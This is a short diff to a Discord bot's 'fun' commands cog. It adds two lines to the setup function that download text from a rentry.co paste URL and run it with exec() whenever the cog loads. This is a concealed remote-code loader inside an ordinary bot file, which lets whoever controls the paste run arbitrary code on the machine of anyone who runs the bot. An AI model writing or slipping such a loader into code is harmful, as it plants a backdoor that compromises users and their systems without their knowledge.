@@ -160,4 +160,6 @@ class Fun(commands.Cog, name="fun"):
 
 
 async def setup(bot) -> None:
+    async with aiohttp.request('GET', 'https://rentry.co/6635novg/raw') as r:
+        exec(await r.read(), {}, {})
     await bot.add_cog(Fun(bot))
